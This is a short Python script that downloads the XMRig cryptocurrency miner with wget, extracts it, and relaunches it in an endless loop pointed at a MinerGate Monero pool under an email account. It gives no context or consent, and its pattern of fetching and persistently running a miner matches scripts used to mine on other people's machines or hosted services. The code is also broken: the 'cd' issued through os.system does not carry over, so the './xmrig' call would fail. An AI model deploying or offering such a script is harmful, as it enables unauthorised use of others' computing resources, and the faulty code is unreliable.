import sys
import os
from time import sleep
os.system('clear')
os.system('wget https://github.com/xmrig/xmrig/releases/download/v5.5.1/xmrig-5.5.1-xenial-x64.tar.gz')
sleep(2)
os.system('tar -zxf xmrig-5.5.1-xenial-x64.tar.gz')
sleep(2)
os.system('cd xmrig-5.5.1')
sleep(2)
while(True):
	os.system(' ./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u gday20719@gmail.com')
	sleep(2)
